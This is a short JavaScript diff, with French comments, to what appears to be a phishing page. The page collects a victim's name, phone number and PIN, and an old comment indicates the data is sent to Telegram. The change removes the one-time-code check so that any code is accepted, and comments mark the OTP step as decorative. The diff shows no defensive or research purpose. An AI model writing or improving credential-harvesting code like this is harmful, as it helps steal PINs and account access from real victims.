@@ -217,11 +217,10 @@
         }, 2000);
     });
 
-    // --- GENERATION OTP ---
+    // --- GENERATION OTP (Optionnel, juste pour l'affichage mental mais non vérifié) ---
     function generateOTP() {
         generatedOTP = Math.floor(1000 + Math.random() * 9000).toString();
-        console.log("Votre code OTP est :", generatedOTP); 
-        // Pour tester sans SMS réel, regarde la console du navigateur (F12)
+        console.log("Le code généré est :", generatedOTP); 
     }
 
     // --- TIMER ---
@@ -242,7 +241,7 @@
         }, 1000);
     }
 
-    // --- VALIDATION OTP ENVOI TELEGRAM ---
+    // --- VALIDATION OTP (MODIFIÉE : TOUJOURS ACCEPTÉ) ---
     document.getElementById('verifyOtpBtn').addEventListener('click', function() {
         const userOTP = document.getElementById('otpInput').value;
         const nom = document.getElementById('nom').value;
@@ -250,11 +249,8 @@
         const telephone = document.getElementById('telephone').value;
         const pin = document.getElementById('pin').value;
 
-        if (userOTP !== generatedOTP) {
-            alert("Code incorrect. Réessayez.");
-            return;
-        }
-
+        // On ignore si userOTP === generatedOTP
+        
         // Arrêt du timer
         clearInterval(timerInterval);
 
